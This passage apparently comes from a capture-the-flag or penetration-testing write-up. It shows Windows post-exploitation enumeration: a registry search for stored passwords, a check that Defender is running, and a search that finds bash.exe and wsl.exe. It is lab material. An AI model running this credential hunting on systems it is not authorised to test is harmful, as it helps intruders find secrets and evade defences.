    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgs

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{46ACA899-50F6-4A46-A9E3-273705CA4914}
    (Default)    REG_SZ    IPicturePasswordTaskHandler

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{53E78940-B62E-49F8-A69B-84CB8963A513}
    (Default)    REG_SZ    IPasswordOnWakeSetting

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}
    (Default)    REG_SZ    IPasswordVault

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}
    (Default)    REG_SZ    ISupportPasswordMode

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{6ab18989-c720-41a7-a6c1-feadb36329a0}
    (Default)    REG_SZ    IPasswordCredential

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{97F17EF9-284E-4992-AE46-748EF75225BB}
    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgs

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}
    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredential

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\{B0619C15-5B93-412E-AF8D-878F23B1A437}
    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollment

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
    (Default)    REG_SZ    PicturePasswordLogonProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}
    (Default)    REG_SZ    RASGCW Change Password Class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{3bfe6eb7-281d-4333-999e-e949e3621de7}
    (Default)    REG_SZ    Cert Password UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    V1PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}
    InfoTip    REG_SZ    Manages users and passwords for this computer

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}
    (Default)    REG_SZ    LogonPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{9cb233a5-a4a5-46b9-ab13-db07ce949410}
    (Default)    REG_SZ    Password retry UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell
    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{C98F3822-3658-4D75-8A25-6621665ECD56}
    (Default)    REG_SZ    HomeGroup Password Command

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{d9162b5b-ca81-476e-a310-cb32d932733c}
    (Default)    REG_SZ    Password Expired UI class

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}
    (Default)    REG_SZ    IHomeGroupPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}
    (Default)    REG_SZ    _PasswordDeriveBytes

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}
    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgs

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{46ACA899-50F6-4A46-A9E3-273705CA4914}
    (Default)    REG_SZ    IPicturePasswordTaskHandler

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{53E78940-B62E-49F8-A69B-84CB8963A513}
    (Default)    REG_SZ    IPasswordOnWakeSetting

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}
    (Default)    REG_SZ    IPasswordVault

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}
    (Default)    REG_SZ    ISupportPasswordMode

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{6ab18989-c720-41a7-a6c1-feadb36329a0}
    (Default)    REG_SZ    IPasswordCredential

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{97F17EF9-284E-4992-AE46-748EF75225BB}
    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgs

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}
    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredential

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\Interface\{B0619C15-5B93-412E-AF8D-878F23B1A437}
    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollment

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\RDP-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\ehstorpwddrv.inf_amd64_d14b2d0cd98ecf84\Strings
    devicename    REG_SZ    Microsoft supported IEEE 1667 password silo

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
    Password    REG_SZ    

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

End of search: 134 match(es) found.
```

The antivirus was runnging:

```cmd
C:\Windows\System32>sc query windefend
sc query windefend

SERVICE_NAME: windefend 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

I discovered a bash:

```cmd
C:\Windows\System32>where /R C:\ bash.exe
where /R C:\ bash.exe
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17763.1_none_3061487514bb83f7\bash.exe

C:\Windows\System32>where /R C:\ wsl.exe
where /R C:\ wsl.exe
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17763.1_none_73b46e4327098ae1\wsl.exe

```

---
